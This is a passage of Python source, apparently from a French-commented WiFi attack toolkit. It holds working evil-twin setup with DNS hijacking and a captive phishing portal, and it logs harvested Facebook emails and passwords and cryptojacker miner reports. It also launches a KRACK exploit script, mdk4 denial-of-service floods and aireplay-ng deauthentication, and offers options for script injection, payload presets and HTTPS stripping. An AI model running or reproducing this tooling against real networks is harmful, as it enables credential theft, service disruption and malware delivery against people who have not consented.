            pwd = data.get("password", "")
            task.log(f"🎣 {ip}  <b>FACEBOOK phishing</b> → "
                     f"email=<b>{escape(email)}</b>  "
                     f"🔑 password=<b>{escape(pwd)}</b>"
                     f"  <span style='color:#888'>@ {escape(domain)}</span>",
                     "info")

        elif ftype == "cryptojacker":
            wid = data.get("worker", "?")
            total = data.get("total_workers", "?")
            hps = data.get("hashrate_hps", 0)
            nonce = data.get("total_nonce", 0)
            sample = str(data.get("sample_hash", ""))[:16]
            task.log(f"⛏️ {ip}  <b>MINER</b> worker {wid}/{total}"
                     f"  <b>{hps} H/s</b>  nonce={nonce}"
                     f"  hash=<span style='color:#888'>{escape(sample)}…</span>",
                     "info")

        else:
            # Fallback générique : montre tous les champs sauf type
            summary = ", ".join(
                f"<b>{escape(k)}</b>={escape(str(v)[:80])}"
                for k, v in data.items() if k != "type"
            )[:400]
            task.log(f"💀 EXFIL [<b>{escape(ftype)}</b>] {ip}  {summary}",
                     "info")

    def _monitor_loop(self, task, portal_log: Path,
                      leases_file: Path, duration: int) -> None:
        """
        Tourne pendant `duration` secondes. À chaque tick (1s) :
          - lit dnsmasq.leases pour détecter nouveaux clients DHCP
          - lit portal_log pour détecter nouvelles soumissions form/exfil/dl
          - logue chaque event en temps réel via task.log()
          - interruptible par task.is_stopped()
        """
        import json as _json
        seen_macs = set()
        seen_log_lines = 0
        elapsed = 0
        last_count_log = 0

        while elapsed < duration:
            if task and task.is_stopped():
                if task: task.log("Fenêtre interrompue par l'utilisateur", "warn")
                return

            # 1. Nouveaux baux DHCP (= nouveaux clients sur le rogue)
            try:
                lines = leases_file.read_text(errors="replace").splitlines()
                for line in lines:
                    parts = line.split()
                    if len(parts) >= 3:
                        mac = parts[1].upper()
                        if mac not in seen_macs:
                            seen_macs.add(mac)
                            ip = parts[2]
                            hostname = parts[3] if len(parts) > 3 else "?"
                            if task:
                                task.log(
                                    f"📱 CLIENT CONNECTÉ : {mac} → {ip} "
                                    f"<b>{hostname}</b>", "info")
            except OSError:
                pass

            # 2. Nouvelles soumissions / exfil / downloads dans portal_log
            try:
                lines = portal_log.read_text(errors="replace").splitlines()
                if len(lines) > seen_log_lines:
                    for line in lines[seen_log_lines:]:
                        parts = line.split("\t")
                        if len(parts) < 4:
                            continue
                        ip = parts[1]
                        kind = parts[2]
                        try:
                            data = _json.loads(parts[3])
                        except Exception:
                            data = {"raw": parts[3]}
                        if not task:
                            continue
                        if kind == "FORM":
                            preview = ", ".join(
                                f"{k}={v}" for k, v in data.items())[:200]
                            task.log(
                                f"📝 FORM submitté depuis {ip} → {preview}",
                                "info")
                        elif kind == "EXFIL":
                            self._fmt_exfil_log(task, ip, data)
                        elif kind == "DOWNLOAD":
                            fname = data.get("file", "?")
                            task.log(
                                f"📦 DOWNLOAD : {ip} a téléchargé "
                                f"<b>{fname}</b>", "warn")
                    seen_log_lines = len(lines)
            except OSError:
                pass

            # 3. Heartbeat toutes les 30s + compteur clients pour le front
            if elapsed - last_count_log >= 30:
                if task:
                    task.log(
                        f"⏱ {elapsed}s/{duration}s · {len(seen_macs)} client(s)"
                        f" connecté(s)", "info")
                last_count_log = elapsed
            # Badge clients (parsé côté front pour le compteur flottant)
            if task and elapsed % 5 == 0:
                task.log(f"__CLIENTS:{len(seen_macs)}__", "meta")

            time.sleep(1)
            elapsed += 1

    def _write_hostapd_conf(self, iface: str, ssid: str, channel: int,
                            auth_mode: str = "open",
                            wpa2_password: str = "") -> None:
        """
        Génère un hostapd.conf.

        - auth_mode=open : AP ouvert, le portail captif est la seule barrière.
        - auth_mode=wpa2 : WPA2-PSK, le client doit fournir le mdp choisi.
          Note : on n'extrait pas les password attempts en clair (faudrait
          hostapd-mana ou un sniffer sur 2e radio).
        """
        hw_mode = "g" if channel <= 14 else "a"
        cfg = (
            f"interface={iface}\n"
            f"driver=nl80211\n"
            f"ssid={ssid}\n"
            f"hw_mode={hw_mode}\n"
            f"channel={channel}\n"
            f"ieee80211n=1\n"
            f"wmm_enabled=1\n"
            f"ignore_broadcast_ssid=0\n"
            f"auth_algs=1\n"
        )
        if auth_mode == "wpa2" and wpa2_password:
            cfg += (
                f"wpa=2\n"
                f"wpa_passphrase={wpa2_password}\n"
                f"wpa_key_mgmt=WPA-PSK\n"
                f"rsn_pairwise=CCMP\n"
            )
        ET_HOSTAPD_CONF.write_text(cfg, encoding="utf-8")

    def _write_dnsmasq_conf(self, iface: str, hijack_dns: bool = True) -> None:
        """
        Génère le dnsmasq.conf.

        - hijack_dns=True  (mode captive) : tous les domaines → ET_IP, déclenche
          la détection captive sur iOS/Android. Pas d'Internet pour le client.
        - hijack_dns=False (mode mitm)    : DNS forwardé vers upstream public,
          le client a vraiment Internet via le Pi (NAT eth0).
        """
        cfg = (
            f"interface={iface}\n"
            f"bind-interfaces\n"
            f"dhcp-range={ET_DHCP_FROM},{ET_DHCP_TO},12h\n"
            f"dhcp-option=3,{ET_IP}\n"
            f"dhcp-option=6,{ET_IP}\n"
            f"dhcp-leasefile={ET_DNSMASQ_LEASES}\n"
        )
        if hijack_dns:
            cfg += (
                f"# Hijack DNS — tout résolu vers le Pi (captive portal trigger)\n"
                f"address=/#/{ET_IP}\n"
                f"no-resolv\n"
                f"no-hosts\n"
            )
        else:
            cfg += (
                f"# Forward DNS vers upstream — le client a vraiment Internet\n"
                f"server=8.8.8.8\n"
                f"server=1.1.1.1\n"
                f"no-hosts\n"
            )
        ET_DNSMASQ_CONF.write_text(cfg, encoding="utf-8")

    # ── KRACK (CVE-2017-13077) ─────────────────────────────────────────────

    def _krack(self, bssid: str, wpa_passphrase: str,
               duration: int) -> Dict[str, Any]:
        """Test/exploit KRACK : rogue AP WPA2 + replay Message 3."""
        err = self._preflight()
        if err:
            return err
        if not KRACK_SCRIPT.exists():
            return {"ok": False,
                    "error": f"Script KRACK introuvable ({KRACK_SCRIPT})."}
        target = self._resolve_target(bssid)
        if target is None:
            return {"ok": False,
                    "error": f"Cible {bssid!r} introuvable. Relance un scan."}
        if not wpa_passphrase or len(wpa_passphrase) < 8:
            return {"ok": False,
                    "error": "Mot de passe WPA2 requis (8-63 caractères)."}

        task = current_task()
        def _log(m, lvl="info"):
            if task: task.log(m, level=lvl)

        iface = self._iface()
        KRACK_DIR.mkdir(parents=True, exist_ok=True)

        _log(f"KRACK test sur <b>{escape(target['essid'])}</b> "
             f"({target['bssid']}, ch{target['channel']})")
        _log(f"Mot de passe : {'*' * len(wpa_passphrase)}")

        # Lancer le script KRACK (sudo, script autonome)
        cmd = [
            "sudo", "-n", "python3", str(KRACK_SCRIPT),
            iface,
            target["bssid"],
            str(target["channel"]),
            target["essid"],
            wpa_passphrase,
            str(duration),
            str(KRACK_PCAP),
        ]
        _log(f"Lancement KRACK ({duration}s)...")

        start = time.time()
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True,
            env={**os.environ, "PYTHONUNBUFFERED": "1"})

        try:
            while time.time() - start < duration + 30:
                if task and task._stop_event and task._stop_event.is_set():
                    _log("Stop demandé", "warn")
                    proc.terminate()
                    break
                rlist, _, _ = _sel.select([proc.stdout], [], [], 1.0)
                if rlist:
                    line = proc.stdout.readline()
                    if not line:
                        break
                    line = line.rstrip()
                    if not line:
                        continue

                    # Parser les messages meta du script
                    meta = re.match(r".*__CLIENTS:(\d+)__", line)
                    if meta:
                        if task:
                            task.log(f"__CLIENTS:{meta.group(1)}__")
                        continue

                    # Coloriser selon le préfixe
                    if line.startswith("[-]"):
                        _log(line[4:], "error")
                    elif line.startswith("[!]"):
                        _log(line[4:], "warn")
                    elif line.startswith("[+]"):
                        _log(line[4:], "ok")
                    else:
                        _log(line[4:] if line.startswith("[*] ") else line)

            proc.wait(timeout=10)
        except Exception as e:
            _log(f"Erreur : {e}", "error")
        finally:
            if proc.poll() is None:
                subprocess.run(["sudo", "-n", "kill", str(proc.pid)],
                               capture_output=True, timeout=5)
                proc.wait(timeout=5)

        elapsed = int(time.time() - start)

        # Archiver le pcap si produit
        pcap = KRACK_PCAP
        pcap_msg = ""
        if pcap.exists() and pcap.stat().st_size > 100:
            stored = memory.store_eviltwin_pcap(
                target["bssid"], target["essid"],
                target["channel"], target.get("encryption", "WPA2"),
                pcap)
            if stored:
                pcap_msg = f"<br>Pcap archivé : {stored}"

        msg = (f"Test KRACK terminé après {elapsed}s sur "
               f"<b>{escape(target['essid'])}</b>.{pcap_msg}")
        return {"ok": True, "message": msg}

    # ── DoS WiFi (mdk4) ──────────────────────────────────────────────────

    def _dos(self, bssid: str, attack: str, duration: int) -> Dict[str, Any]:
        """DoS WiFi via mdk4 — beacon/auth/deauth/michael."""
        err = self._preflight()
        if err:
            return err
        if not _which("mdk4"):
            return {"ok": False,
                    "error": "mdk4 requis (sudo apt install -y mdk4)."}
        target = self._resolve_target(bssid)
        if target is None:
            return {"ok": False,
                    "error": f"Cible {bssid!r} introuvable. Relance un scan."}

        task = current_task()
        def _log(m, lvl="info"):
            if task: task.log(m, level=lvl)

        iface = self._iface()
        mon_iface = _enter_monitor(iface)
        _set_channel(mon_iface, target["channel"])
        time.sleep(0.3)

        attack_labels = {
            "beacon":  "Beacon Flood",
            "auth":    "Auth Flood",
            "deauth":  "Deauth amass",
            "michael": "Michael (TKIP)",
        }
        _log(f"DoS <b>{attack_labels.get(attack, attack)}</b> sur "
             f"<b>{escape(target['essid'])}</b> ({target['bssid']}, "
             f"ch{target['channel']}) — {duration}s")

        start = time.time()
        try:
            if attack == "beacon":
                # Beacon flood : génère des SSIDs aléatoires sur le canal
                cmd = ["sudo", "-n", "mdk4", mon_iface, "b",
                       "-c", str(target["channel"])]
            elif attack == "auth":
                # Auth flood : submerge l'AP de requêtes d'authentification
                cmd = ["sudo", "-n", "mdk4", mon_iface, "a",
                       "-a", target["bssid"]]
            elif attack == "deauth":
                # Deauth massif (toutes les stations)
                cmd = ["sudo", "-n", "mdk4", mon_iface, "d",
                       "-B", target["bssid"],
                       "-c", str(target["channel"])]
            elif attack == "michael":
                # Attaque Michael (TKIP seulement — force l'AP à se shutdown)
                cmd = ["sudo", "-n", "mdk4", mon_iface, "m",
                       "-t", target["bssid"]]
            else:
                return {"ok": False, "error": f"Type d'attaque inconnu : {attack}"}

            _log(f"<span class='ts'>$ {' '.join(cmd)}</span>")
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True)

            lines_count = 0
            while time.time() - start < duration:
                if task and task._stop_event and task._stop_event.is_set():
                    _log("Stop demandé", "warn")
                    break
                # Lecture non-bloquante des lignes mdk4
                rlist, _, _ = _sel.select([proc.stdout], [], [], 1.0)
                if rlist:
                    line = proc.stdout.readline()
                    if line:
                        lines_count += 1
                        if lines_count <= 30 or lines_count % 10 == 0:
                            _log(f"<span class='ts'>{escape(line.rstrip())}</span>")

            # Kill mdk4
            subprocess.run(["sudo", "-n", "kill", str(proc.pid)],
                           capture_output=True, timeout=5)
            proc.wait(timeout=5)

        except Exception as e:
            _log(f"Erreur mdk4 : {e}", "error")
        finally:
            # Kill résiduel
            subprocess.run(["sudo", "-n", "pkill", "-9", "mdk4"],
                           capture_output=True, timeout=5)
            _exit_monitor(mon_iface)

        elapsed = int(time.time() - start)
        msg = (f"DoS <b>{attack_labels.get(attack, attack)}</b> terminé "
               f"après {elapsed}s sur <b>{escape(target['essid'])}</b>.")
        _log(msg, "ok" if True else "info")
        return {"ok": True, "message": msg}

    def _deauth(self, bssid: str, client: str, count: int) -> Dict[str, Any]:
        err = self._preflight()
        if err:
            return err
        target = self._resolve_target(bssid)
        if target is None:
            return {"ok": False,
                    "error": f"Cible {bssid!r} introuvable. Relance un scan."}
        iface = self._iface()
        client_mac = client.strip() if client and client.strip() != "*" else ""
        _clean_scan_dir()
        mon_iface = _enter_monitor(iface)
        try:
            # ★ Fix : lock le canal AVANT aireplay (sinon "No such BSSID")
            _set_channel(mon_iface, target["channel"])
            time.sleep(0.3)

            cmd = ["sudo", "-n", "aireplay-ng",
                   "-0", str(count), "-a", target["bssid"]]
            if client_mac:
                cmd += ["-c", client_mac]
            cmd.append(mon_iface)
            res = _run(cmd, timeout=max(30, count * 3))
            output = (res.stdout or "") + (res.stderr or "")
        finally:
            _exit_monitor(mon_iface)

        target_txt = client_mac or "broadcast"
        msg = (f"Deauth envoyée → {target_txt} (×{count}) sur "
               f"<b>{escape(target['essid'])}</b> ch {target['channel']}.\n"
               f"<pre style='margin:6px 0 0;white-space:pre-wrap'>"
               f"{escape(output[:600])}</pre>")
        return {"ok": True, "target": target, "deauth_target": target_txt,
                "count": count, "message": msg}

    # ── Dispatcher ──────────────────────────────────────────────────────────

    def run(self, action_id: str, params: Dict[str, Any]) -> Dict[str, Any]:
        iface = self._iface()
        if iface is None:
            return {"ok": False,
                    "error": "Aucun adaptateur externe détecté (wlan1 absent)."}
        known = {a.id for a in self.actions()}
        if action_id not in known:
            return {"ok": False, "error": f"action inconnue: {action_id}"}

        bssid = str(params.get("bssid", ""))
        client = str(params.get("client", ""))
        try:
            duration = int(params.get("duration", DEFAULT_SCAN_DURATION))
        except (TypeError, ValueError):
            duration = DEFAULT_SCAN_DURATION
        try:
            count = int(params.get("count", DEFAULT_DEAUTH_COUNT))
        except (TypeError, ValueError):
            count = DEFAULT_DEAUTH_COUNT

        # ★ Catch global : toute exception devient {ok:false, error} + log stderr
        try:
            if action_id == "scan":
                return self._scan(max(5, min(60, duration)))
            if action_id == "clients":
                return self._clients(max(5, min(60, duration)),
                                     target_bssid=bssid)
            if action_id == "wifite":
                return self._wifite_attack(bssid, max(60, min(600, duration)))
            if action_id == "handshake":
                return self._handshake_passive(bssid, max(10, min(300, duration)))
            if action_id == "handshake_deauth":
                return self._handshake_deauth(bssid, max(10, min(300, duration)),
                                              client, max(1, min(100, count)))
            if action_id == "pmkid":
                return self._pmkid(bssid, max(10, min(300, duration)))
            if action_id == "deauth":
                return self._deauth(bssid, client, max(1, min(100, count)))
            if action_id == "dos":
                attack = str(params.get("attack", "beacon"))
                return self._dos(bssid, attack, max(5, min(120, duration)))
            if action_id == "krack":
                wpa_pass = str(params.get("wpa_passphrase", ""))
                return self._krack(bssid, wpa_pass, max(30, min(600, duration)))
            if action_id == "eviltwin":
                try:
                    deauth_pre = int(params.get("deauth_pre_seconds", 0))
                except (TypeError, ValueError):
                    deauth_pre = 0
                return self._eviltwin(
                    bssid, max(30, min(600, duration)),
                    custom_ssid=str(params.get("custom_ssid", "")),
                    template=str(params.get("template", "wifi-auth")),
                    custom_portal_html=str(params.get("custom_portal_html", "")),
                    portal_name=str(params.get("portal_name", "")),
                    auth_mode=str(params.get("auth_mode", "open")),
                    wpa2_password=str(params.get("wpa2_password", "")),
                    mode=str(params.get("mode", "captive")),
                    inject_script=str(params.get("inject_script", "")),
                    payload_preset=str(params.get("payload_preset", "")),
                    strip_https=str(params.get("strip_https", "no")),
                    deauth_pre_seconds=max(0, min(60, deauth_pre)),
                    deauth_continuous=str(params.get("deauth_continuous", "no")),
                    deauth_target_client=str(params.get("deauth_target_client", "")),
                )
            return {"ok": True, "stub": True, "iface": iface,
                    "message": f"[stub] '{action_id}' prêt."}
        except Exception as e:
            tb = traceback.format_exc()
            print(f"[wifi] EXCEPTION dans run({action_id}, {params}): "
                  f"{type(e).__name__}: {e}\n{tb}", file=sys.stderr)
            return {"ok": False,
                    "error": f"{type(e).__name__}: {e}",
                    "trace": tb.splitlines()[-6:]}
